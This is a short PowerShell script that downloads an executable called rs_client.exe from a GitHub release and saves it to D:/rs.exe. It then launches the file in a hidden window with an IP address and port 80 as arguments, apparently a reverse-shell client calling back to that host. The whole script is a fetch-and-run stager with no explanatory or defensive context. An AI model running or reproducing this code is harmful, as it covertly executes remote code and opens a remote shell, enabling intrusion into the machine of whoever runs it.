$fileUrl = 'https://github.com/renoob21/rs_client/releases/download/First-Release/rs_client.exe';
$path = 'D:/rs.exe';

Invoke-WebRequest -Uri $fileUrl -OutFile $path;

if (Test-Path $path) {
    Start-Process -WindowStyle Hidden -FilePath $path -ArgumentList '178.128.16.88 80';
}